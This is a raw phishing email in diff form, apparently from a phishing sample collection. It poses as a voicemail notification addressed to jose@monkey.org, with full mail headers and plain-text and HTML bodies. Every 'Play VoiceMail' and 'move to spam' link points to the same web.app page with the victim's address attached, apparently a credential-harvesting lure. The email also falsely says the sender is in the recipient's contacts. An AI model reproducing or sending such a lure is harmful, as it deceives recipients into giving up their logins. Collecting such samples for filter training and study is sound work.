@@ -1,0 +1,168 @@
+Return-Path: info@baliyev.com
+Delivered-To: jose@monkey.org
+X-FDA: 77725459014.29.tail84_0e17fc127559
+X-Spam-Summary: 50,0,0,571a2b7e8513c895,d41d8cd98f00b204,info@baliyev.com,,RULES_HIT:41:69:72:152:355:379:474:559:800:960:962:967:973:978:983:988:989:1021:1189:1208:1221:1260:1263:1308:1309:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1535:1543:1561:1575:1588:1589:1592:1594:1711:1712:1714:1730:1776:1792:1801:2525:2526:2527:2528:2543:2549:2553:2567:2610:2682:2685:2859:2902:2933:2937:2939:2942:2945:2947:2951:2954:3022:3040:3138:3139:3140:3141:3142:3148:3362:3586:3867:3870:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4118:4321:4379:4384:4605:5007:6117:6119:6261:6653:6678:6688:6996:6997:7223:7576:7653:7903:7904:8603:8825:8829:8885:8957:9010:9025:9059:9082:9388:9392:9411:9908:10004:10026:10215:10231:10346:10400:11239:11657:11658:11783:11914:12043:12297:12438:12517:12519:12555:12679:12683:12740:12895:12986:13095:13110:13139:13178:13229:13237:14093:14096:14110:14181:14596:14659:14721:14818:14829:21080:21433:21451:21483:21524:21554:21627:21810:21819:21881:21917:21939:22017:221
+X-HE-Tag: tail84_0e17fc127559
+X-Filterd-Recvd-Size: 7334
+Received: from linuxhosting.cloudinhost.com (linuxhosting.cloudinhost.com [138.201.18.59])
+	by imf21.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 20 Jan 2021 08:21:26 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=xn--scherenhebebhnen-uzb.com; s=default; h=Content-Type:MIME-Version:
+	Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	 bh=pFztUKPug2EpubK4snScbdbWY2PNvp7c3Z57+XHW/BA=; b=Si/KB6CQFH2i8OeLm5qyJLWWL
+	v3XUwLrRT0v9yY0YHJylMTGpaLUOLPkoJ3hiEO6mmIB//8gmznIt7ebnmRyBdG1KSfH05p60JYdBb
+	J3/hidNXB5Qr9ZVUWhdwDEoPY+1ziyp9SQP/P26CYHzi6+2AGQ8gCyfujIjwP1SdUnAyqd0XqCmmd
+	1+5mARsDRCf3yZbL33pLXlUtHPcPs8WmfyZIryWhNLUZoTYDNfGu1uccYOgufBU9Nj75ccJcFg//1
+	CLD4uOSZ4PkJ7xROYg4mIYXWj4icBkPj49ZrrNz9wMQgMyvjYARfticz7Kq2eQ6vdBnZD1U/0aGL2
+	yVOr6lANQ==;
+Received: from ec2-3-90-164-29.compute-1.amazonaws.com ([3.90.164.29]:54778)
+	by linuxhosting.cloudinhost.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.93)
+	(envelope-from <info@baliyev.com>)
+	id 1l28k1-0003Fk-Fg
+	for jose@monkey.org; Wed, 20 Jan 2021 09:21:25 +0100
+From: "Support" <info@baliyev.com>
+To: jose@monkey.org
+Subject: New Recording [13913670]
+Date: 20 Jan 2021 08:21:25 +0000
+Message-ID: <20210120082125.8096F9B1B5D2BCE1@baliyev.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_647CDEBF.6512BD4A"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - linuxhosting.cloudinhost.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - baliyev.com
+X-Get-Message-Sender-Via: linuxhosting.cloudinhost.com: authenticated_id: xnscherenhebebhn/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: linuxhosting.cloudinhost.com: xnscherenhebebhn
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 3
+
+
+------=_NextPart_000_0012_647CDEBF.6512BD4A
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Voice Mail =C2=A0=C2=A0=C2=A0
+-----------------------------------------------------------------
+You have recived a New Voice Message from +1-800-90-8767
+
+-----------------------------------------------------------------
+Details:
+
+From: +1-900-908-987
+
+Received: Mon Jan 20, 2021
+
+Length: 00:35
+
+Play VoiceMail (32.6kb) =C2=A0=C2=A0=C2=A0=20
+(=C2=A0https://mayaadri-an32.web.app/saklncsao.html#jose@monkey.org=C2=A0)
+-----------------------------------------------------------------
+This E-mail was sent from someone in your contact list, if you=20
+are receiving this in error, click Click Here=20
+(=C2=A0https://mayaadri-an32.web.app/saklncsao.html#jose@monkey.org=C2=A0)=
+=20
+to move to spam
+------=_NextPart_000_0012_647CDEBF.6512BD4A
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+
+<html lang=3D"en"><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title>New Message</title>
+    <!-- CSS only -->
+    <link href=3D"https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/c=
+ss/bootstrap.min.css" rel=3D"stylesheet" crossorigin=3D"anonymous" integrit=
+y=3D"sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP=
+1">
+</head>
+
+<body style=3D"margin:0;font-family:var(--bs-font-sans-serif);font-size:1re=
+m;font-weight:400;line-height:1.5;color:#212529;background-color:#fff;-webk=
+it-text-size-adjust:100%;-webkit-tap-highlight-color:transparent">
+    <div style=3D"width:100%;padding-right:var(--bs-gutter-x,.75rem);paddin=
+g-left:var(--bs-gutter-x,.75rem);margin-right:auto;margin-left:auto" class=
+=3D"container">
+        <div class=3D"row">
+            <div class=3D"col-md-6">
+                <div class=3D"card">
+                    <div class=3D"card-body">
+                        <h5 class=3D"text-info text-center">Voice Mail &nbs=
+p;&nbsp;&nbsp;<span><svg xmlns=3D"http://www.w3.org/2000/svg" class=3D"bi b=
+i-envelope-fill" fill=3D"currentColor" viewBox=3D"0 0 16 16" width=3D"16" h=
+eight=3D"16">
+                                    <path d=3D"M 0.05 3.555 A 2 2 0 0 1 2 2=
+ h 12 a 2 2 0 0 1 1.95 1.555 L 8 8.414 L 0.05 3.555 Z M 0 4.697 v 7.104 l 5=
+=2E803 -3.558 L 0 4.697 Z M 6.761 8.83 l -6.57 4.027 A 2 2 0 0 0 2 14 h 12 =
+a 2 2 0 0 0 1.808 -1.144 l -6.57 -4.027 L 8 9.586 l -1.239 -0.757 Z m 3.436=
+ -0.586 L 16 11.801 V 4.697 l -5.803 3.546 Z" />
+                                </svg></span></h5>
+                        <hr class=3D"bg-info">
+                        <div class=3D"text-left">
+                            <p class=3D"card-text text-muted">You have reci=
+ved a <b>New Voice Message</b> from
+                                <b>+1-800-90-8767</b>
+                            </p>
+                            <hr class=3D"bg-info">
+                            <p class=3D"text-muted"><b>Details:</b></p>
+                            <p>From: <span class=3D"text-muted"><b>+1-900-9=
+08-987</b></span></p>
+                            <p>Received: <span class=3D"text-muted"><b>Mon =
+Jan 20, 2021</b></span></p>
+                            <p>Length: <span class=3D"text-muted">00:35</sp=
+an></p>
+                            <a class=3D" btn btn-info text-light" href=3D"h=
+ttps://mayaadri-an32.web.app/saklncsao.html#jose@monkey.org"><b>Play VoiceM=
+ail (32.6kb)</b>
+                                &nbsp;&nbsp;&nbsp;
+                                <span>
+                                    <svg xmlns=3D"http://www.w3.org/2000/sv=
+g" class=3D"bi bi-download" fill=3D"currentColor" viewBox=3D"0 0 16 16" wid=
+th=3D"16" height=3D"16">
+                                        <path d=3D"M 0.5 9.9 a 0.5 0.5 0 0 =
+1 0.5 0.5 v 2.5 a 1 1 0 0 0 1 1 h 12 a 1 1 0 0 0 1 -1 v -2.5 a 0.5 0.5 0 0 =
+1 1 0 v 2.5 a 2 2 0 0 1 -2 2 H 2 a 2 2 0 0 1 -2 -2 v -2.5 a 0.5 0.5 0 0 1 0=
+=2E5 -0.5 Z" />
+                                        <path d=3D"M 7.646 11.854 a 0.5 0.5=
+ 0 0 0 0.708 0 l 3 -3 a 0.5 0.5 0 0 0 -0.708 -0.708 L 8.5 10.293 V 1.5 a 0.=
+5 0.5 0 0 0 -1 0 v 8.793 L 5.354 8.146 a 0.5 0.5 0 1 0 -0.708 0.708 l 3 3 Z=
+" />
+                                    </svg>
+                                </span>
+                            </a>
+                            <hr class=3D"bg-info">
+                            <p class=3D"text-muted text-center"><i>This E-m=
+ail was sent from someone in your contact list,=20
+                                if you are receiving this in error, click <=
+a class=3D"text-info" href=3D"https://mayaadri-an32.web.app/saklncsao.html#=
+jose@monkey.org">Click Here</a> to move to spam</i></p>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+</body></html>
+------=_NextPart_000_0012_647CDEBF.6512BD4A--
+
